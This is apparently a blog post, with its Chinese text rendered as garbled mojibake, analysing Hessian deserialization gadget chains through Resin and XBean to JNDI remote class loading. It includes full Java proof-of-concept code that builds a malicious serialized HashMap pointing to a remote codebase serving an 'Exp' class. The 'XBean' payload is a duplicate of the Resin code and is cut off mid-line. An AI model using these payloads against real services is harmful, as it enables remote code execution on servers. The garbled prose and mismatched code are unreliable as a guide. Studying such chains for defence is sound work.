ä¸Šæ¯å¤©è¦æ‰“æ¸¸æˆæ‰€ä»¥å®åœ¨æ˜¯æ²¡æ—¶é—´å†™äº†ï¼Œä»Šå¤©æŠ½ç©ºå†™ä¸€ä¸‹å…å¾—è‡ªå·±ä»¥ååˆå¿˜è®°äº†ã€‚</p><h2 id="Resiné“¾"><a href="#Resiné“¾" class="headerlink" title="Resiné“¾"></a>Resiné“¾</h2><p>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾ä¹Ÿæå‰æ ‡æ³¨ä¸€ä¸‹å§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">85</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">158</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getContext:<span class="number">439</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getTargetContext:<span class="number">55</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">composeName:<span class="number">180</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">toString:<span class="number">353</span>, QName (com.caucho.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">1160</span>, HessianInput (com.caucho.hessian.io)</span><br><span class="line">Hessian_unserialize:<span class="number">87</span>, Hessian_Resin (com.ocean)</span><br><span class="line">main:<span class="number">43</span>, Hessian_Resin (com.ocean)</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨é“¾åˆ†æ"><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>å…ˆæ¥è¯´ä¸€ä¸‹è¿™æ¡é“¾å­ä¸»è¦æ˜¯é€šè¿‡HashMapä¸­PutValæ–¹æ³•é‡Œçš„key.equals(k)è§¦å‘XString çš„equalsæ–¹æ³•ã€‚å…¶å®ä¹‹å‰ä¹Ÿæœ‰è¿‡äº†è§£åœ¨å­¦ä¹ FastJsonçš„æ—¶å€™</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104160754479.png" class=""><p>è¿™é‡Œä¼šè°ƒç”¨toStingæ–¹æ³•è€Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯com.caucho.naming.QNameç±»ã€‚çœ‹çœ‹å…¶toStringæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161327316.png" class=""><p>ä¼šè°ƒç”¨ä¸€ä¸ªcomposeNameçš„æ–¹æ³•ï¼Œåˆ©ç”¨çš„æ˜¯javax.naming.spi.ContinuationContextè¿™ä¸ªç±»</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161631606.png" class=""><p>è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨getTargetContextæ–¹æ³•ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161733694.png" class=""><p>å‘ç°è¿™é‡Œè°ƒç”¨äº†NamingManager.getContextæ–¹æ³•ï¼Œè¿™é‡Œå°±æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œåˆ†æè¿‡Jndiæ³¨å…¥çš„å¸ˆå‚…åº”è¯¥éƒ½æœ‰äº†è§£ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨èµ°ä¸€éï¼Œè·Ÿè¿›è¿™ä¸ªgetContextæ–¹æ³•ã€‚è¿™é‡Œå¤šè¯´ä¸€å¥å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„æ˜¯cpe.getResolveObjæ‰€ä»¥åœ¨åé¢æ„é€ çš„æ—¶å€™ä¼šä½¿ç”¨CannotProceedExceptionè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ„é€ è€Œå·²çš„refrenceå¯¹åƒä¼ å…¥è¿™é‡Œ</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162119159.png" class=""><p>èµ°åˆ°getObjectInstaceæ–¹æ³•ä¸­</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162237509.png" class=""><p>ä¼šè°ƒç”¨åˆ°è¿™ä¸ªgetObjectFactoryferenceæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162313983.png" class=""><p>è¿™é‡Œå°±æ˜¯æ¼æ´è§¦å‘ç‚¹äº†ï¼Œä»–ä¼šç°åœ¨æœ¬åœ°åŠ è½½ç±»ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šå»è¿œç¨‹åŠ è½½ç±»ï¼Œä½†æ˜¯åŒæ—¶ä¼šåˆ¤æ–­è¿™ä¸ªcodebaseçš„å€¼ï¼Œæ‰€ä»¥ä¼šå—åˆ°javaçš„ç‰ˆæœ¬å½±å“ã€‚</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170343863.png" class=""><p>æ¥çœ‹ä¸€ä¸‹ç½‘ä¸Šçš„Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;siJdcpuR&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;aiwin&quot;</span>,<span class="string">&quot;aiwin1&quot;</span>); <span class="comment">//_itemsè¦è¿‡forå¾ªç¯  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//å°†å“ˆå¸Œå€¼è½¬æ¢å›åŸå§‹æ•°æ®çš„ç®—æ³•,æ”¾å…¥åˆ°Xstringçš„å€¼ä¸­,ä¸ºäº†p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104164259843.png" class=""><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚çœ‹åˆ°Payloadå…¶å®ä¼šæœ‰ç–‘é—®å°±æ˜¯æœ‰ä¸¤ä¸ªè®¡ç®—hashçš„åœ°æ–¹ï¼Œè¿™é‡Œæˆ‘æ˜¯çœ‹çš„å…¶ä»–å¸ˆå‚…çš„blogå¯ä»¥å‚è€ƒä»–ä»¬çš„è§£é‡Šï¼š</p><p><a href="https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g">https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g</a><br><a href="https://xz.aliyun.com/t/13599">https://xz.aliyun.com/t/13599</a></p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165104584.png" class=""><p>è¿™é‡Œè¦æƒ³èµ°åˆ°è¿™ä¸ªkey.equalså°±éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><ul><li>(p &#x3D; tab[i &#x3D; (n - 1) &amp; hash]) &#x3D;&#x3D; null</li><li>p.hash &#x3D;&#x3D; hash</li></ul><p>é‚£ä¹ˆä¸ºä»€ä¹ˆå¯ä»¥åˆ©ç”¨hashç¢°æ’æ¥è¿›è¡Œç»•è¿‡å‘¢ï¼Œæ˜¯å› ä¸ºXstringæ–¹æ³•å†²å†™äº†hashcodeæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165946484.png" class=""><p>è¿™æ˜¯è°ƒç”¨çš„stræ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170020823.png" class=""><p>å°±æ˜¯å°†m_objå±æ€§è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹è¿”å›ï¼Œæœ€åè°ƒç”¨Stringçš„hashCodeæ–¹æ³•è¿›è¡Œhashè®¡ç®—ï¼Œè¿™é‡Œçš„m_objå³æ˜¯å®ä¾‹åŒ–XStringä¼ å…¥çš„å‚æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®Qnameçš„hashcodeæ¥æ„é€ Xstringçš„hashcodeä¹Ÿå°±å¯ä»¥è§¦å‘æ•´æ¡è°ƒç”¨é“¾</p><h2 id="XBeané“¾"><a href="#XBeané“¾" class="headerlink" title="XBeané“¾"></a>XBeané“¾</h2><p>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">61</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">146</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">resolve:<span class="number">73</span>, ContextUtil (org.apache.xbean.naming.context)</span><br><span class="line">getObject:<span class="number">204</span>, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">toString:<span class="number">192</span>, Binding (javax.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">main:<span class="number">34</span>, Hessian_XBean (com.ocean)</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨é“¾åˆ†æ-1"><a href="#è°ƒç”¨é“¾åˆ†æ-1" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>XBean è¿™æ¡é“¾å‡ ä¹æ˜¯ä¸ Resin ä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯åœ¨ XBean ä¸­æ‰¾åˆ°äº†ç±»ä¼¼åŠŸèƒ½çš„å®ç°ã€‚<br>è¿™é‡Œé¦–å…ˆè¿˜æ˜¯ä¼šä»Xstringè¿™é‡Œè§¦å‘toStringæ–¹æ³•ä¸è¿‡è¿™æ¬¡èµ°çš„Bindingç±»çš„toStringæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183559048.png" class=""><p>è¿™é‡Œåªæœ‰ä¸€ä¸ªgetObjectæ–¹æ³•ï¼Œè€Œåœ¨ContextUtil$ReadOnlyBindingç±»é‡Œå­˜åœ¨getObjectæ–¹æ³•ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯Bindingçš„å­ç±»ï¼Œæ‰€ä»¥è°ƒç”¨ReadOnlyBindingçš„toStringä¼šæ‰§è¡Œåˆ°ReadOnlyBindingçš„getObjectæ–¹æ³•ã€‚</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183742050.png" class=""><p>è¿™é‡Œä¼šè°ƒç”¨ContextUtil#resolveæ–¹æ³•è·Ÿè¿›</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183818375.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨NamingManager.getObjectInstanceæ–¹æ³•é‚£ä¹ˆå‰©ä¸‹çš„å°±å’Œä¸Šé¢Resignä¸€æ ·äº†ã€‚ä»è¿œç¨‹åŠ è½½æ¶æ„ç±»æ‰§è¡Œã€‚</p><p>ç»™å‡ºPayload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> 